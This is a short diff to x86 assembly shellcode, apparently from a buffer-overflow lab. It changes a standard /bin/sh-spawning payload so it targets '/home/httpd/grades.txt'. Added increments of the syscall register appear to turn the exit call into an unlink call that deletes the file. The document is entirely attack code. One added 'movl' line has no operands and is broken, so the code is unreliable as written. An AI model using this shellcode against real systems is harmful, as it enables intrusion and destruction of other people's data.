@@ -1,7 +1,9 @@
 #include <sys/syscall.h>
 
 #define STRING	"/bin/sh"
+#define PATH "/home/httpd/grades.txt"
 #define STRLEN	7
+#define PATHLEN 23
 #define ARGV	(STRLEN+1)
 #define ENVP	(ARGV+4)
 
@@ -26,6 +28,16 @@
 
 	xorl	%ebx,%ebx		/* syscall arg 2: 0 */
 	movl	%ebx,%eax
+	movl    
+	inc	%eax
+	inc	%eax
+	inc	%eax
+	inc	%eax
+	inc	%eax
+	inc	%eax
+	inc	%eax
+	inc	%eax
+	inc	%eax
 	inc	%eax			/* syscall arg 1: SYS_exit (1), uses */
 					/* mov+inc to avoid null byte */
 	int	$0x80			/* invoke syscall */
@@ -33,3 +45,4 @@
  calladdr:
 	call	popladdr
 	.ascii	STRING
+	.ascii  PATH
